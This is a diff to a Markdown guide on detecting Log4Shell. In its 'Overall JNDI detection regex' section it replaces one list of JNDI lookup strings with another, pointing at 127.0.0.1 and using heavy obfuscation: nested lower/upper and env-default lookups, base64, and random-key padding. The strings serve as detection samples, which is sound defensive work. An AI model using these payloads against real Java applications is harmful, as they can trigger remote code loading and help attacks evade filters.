@@ -110,14 +110,21 @@ Detection can be split up to three phases:
 ### Overall JNDI detection regex
 
 ```plain
-${jndi:rmi://1.1.1[.]1:1389/Binary}
-${jndi:rmi://1.1.1.1:1389/Binary}
-${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://1.1.1.1:1389/Binary}
-${jndi:rmi://1.1.1.1:1389/Binary}
-${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://1.1.1.1/Binary}
-${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://1.1.1.1:1389/Binary}
-${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://1.1.1.1:1389/Binary}
-${${lower:${lower:jndi}}:${lower:rmi}://1.1.1.1:1389/Binary}
+\044%7B\\44{env:NOTHING:-j}\u0024{lower:N}\\u0024{lower:${upper:d}}}i:dns:/127.0.0.1:1389}
+${${::-j}nd${upper:ı}:rm${upper:ı}://127.0.0.1:1389}
+${${base64:JHtqbmRpOmxkYXA6YWRkcn0=}}
+${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//127.0.0.1:1389}
+${jndi:${lower:l}${lower:d}a${lower:p}://$127.0.0.1:1389}
+${jndi:${lower:l}${lower:d}a${lower:p}://127.0.0.1:1389
+${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://127.0.0.1/Binary}
+${jndi:dns://127.0.0.1:1389}
+${jndi:rmi://127.0.0.1:1389}
+${jndi:dns:${jndi:pwd}${jndi:pwd}127.0.0.1:1389}
+${jndi:ldap://127.0.0.1:1099/obj}
+${${upper:j}n${lower:d}${lower:i}:l${lower:d}${lower:a}${lower:p}${lower::}${lower:/}${lower:/}1${lower:2}${lower:7}.0${lower:.}0${lower:.}${lower:1}${lower::}10${lower:9}9${lower:/}o${lower:b}j}
+${${upper:j}${lower:n}${lower:d}${lower:i}${lower::}${lower:l}${lower:d}${lower:a}${lower:p}${lower::}${lower:/}${lower:/}${lower:1}${lower:2}${lower:7}${lower:.}${lower:0}${lower:.}${lower:0}${lower:.}${lower:1}${lower::}${lower:1}${lower:0}${lower:9}${lower:9}${lower:/}${lower:o}${lower:b}${lower:j}}
+${jndi:ld${ozI:Kgh:Qn:TXM:-a}p:${DBEau:Y:pLXUu:SfRKk:vWu:-/}${x:UMADq:-/}127${lt:tWd:iEVW:pD:tGCr:-.}${jFpSDW:z:SN:AuqM:C:-0}${dxxilc:HTFa:QLgii:pv:-.}0.${a:l:urnrtk:-1}:1099${zlSEqQ:T:qg:o:-/}ob${E:yJDsbq:-j}}
+${${eh:wDUdos:jKY:-j}${xksV:Xgi:-n}${hNdb:SbmXU:goWgvJ:iqAV:Ux:-d}${MXWN:oOi:c:UxXzcI:-i}${DYKgs:tHlY:-:}${d:FHdMm:fw:-l}${Gw:-d}${LebGxe:c:SxLXa:-a}${echyWc:BE:NBO:s:gVbT:-p}${l:QwCL:gzOQm:gqsDS:-:}${qMztLn:e:E:WS:-/}${NUu:S:afVNbT:kyjbiE:-/}${PtGUfI:WcYh:c:-1}${YoSJ:KUV:uySK:crNTm:-2}${EwkY:EsX:S:wk:-7}${HUWOJ:MMIxOn:S:-.}${MHF:s:-0}${obrJVU:RPw:d:A:-.}${E:RgY:j:-0}${MaOtbM:-.}${O:-1}${zzfuGD:YEyvy:mhp:T:-:}${vlaw:WuOBz:-1}${HAjxt:ziBgmc:-0}${UKVBrk:sNAKe:F:qXNetQ:mdIuOW:-9}${geJs:sgYgQW:oOd:qOGf:aYpAkP:-9}${UonINv:-/}${aTygHK:pbQiTB:KkXhKS:-o}${FMRAKM:-b}${wiu:vKIVuh:-j}}
 ```
 
 ```plain
